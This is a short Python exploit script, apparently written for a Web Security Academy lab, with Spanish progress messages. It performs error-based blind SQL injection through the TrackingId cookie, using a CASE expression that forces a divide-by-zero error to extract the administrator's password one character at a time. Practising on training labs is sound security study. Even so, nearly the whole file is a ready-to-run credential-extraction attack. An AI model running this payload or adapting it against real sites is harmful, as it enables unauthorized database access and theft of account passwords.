#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n [+] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

main_url = "https://0adc00e8038797d5852209c000590074.web-security-academy.net/"
characters = string.ascii_lowercase + string.digits

def makeRequests():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)
    
    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': "qLyaOncNn7X39g48' || (select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
                'session': 'YNvAPNLlSNBPd0AVU2bQtQE18a0yV0Cw'
            }

            p1.status(cookies['TrackingId'])
            r = requests.get(main_url, cookies=cookies)

            if r.status_code == 500:
                password += character
                p2.status(password)
                break

if __name__ == "__main__":
    makeRequests()
